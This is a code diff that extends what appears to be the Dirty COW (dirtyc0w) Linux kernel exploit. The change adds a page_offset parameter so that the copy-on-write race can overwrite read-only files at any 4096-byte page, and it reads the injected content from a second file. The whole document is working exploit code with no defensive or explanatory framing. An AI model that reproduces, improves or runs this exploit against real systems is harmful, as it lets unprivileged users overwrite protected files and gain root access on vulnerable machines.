@@ -31,6 +31,7 @@ int f;
 struct stat st;
 char *name;
 int size;
+int page_offset;
 
 void *madviseThread(void *arg)
 {
@@ -63,15 +64,15 @@ You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?
   int f=open("/proc/self/mem",O_RDWR);
   int i,c=0;
   int f2 = open(str, O_RDWR);
-  char buf[1024];
+  char buf[4096];
   for(i=0;i<100000000;i++) {
 /*
 You have to reset the file pointer to the memory position.
 */
     lseek(f,(uintptr_t) map,SEEK_SET);
-    lseek(f2,0,SEEK_SET);
-    read(f2, buf, size);
-    c += write(f, buf, size);
+    lseek(f2,4096*page_offset,SEEK_SET);
+    int r = read(f2, buf, size);
+    c += write(f, buf, r);
 //    c+=write(f,str,size);
 //    c+=write(f,str,strlen(str));
   }
@@ -84,13 +85,14 @@ int main(int argc,char *argv[])
 /*
 You have to pass two arguments. File and Contents.
 */
-  if (argc<4) {
+  if (argc<5) {
   (void)fprintf(stderr, "%s\n",
-      "usage: dirtyc0w target_file new_content size");
+      "usage: dirtyc0w target_file new_content size page_offset");
   return 1; }
   pthread_t pth1,pth2;
 
   size = atoi(argv[3]);
+  page_offset = atoi(argv[4]);
 /*
 You have to open the file in read only mode.
 */
@@ -108,7 +110,7 @@ You have to use MAP_PRIVATE for copy-on-write mapping.
 /*
 You have to open with PROT_READ.
 */
-  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,4096*page_offset);
   printf("mmap %zx\n\n",(uintptr_t) map);
 /*
 You have to do it on two threads.
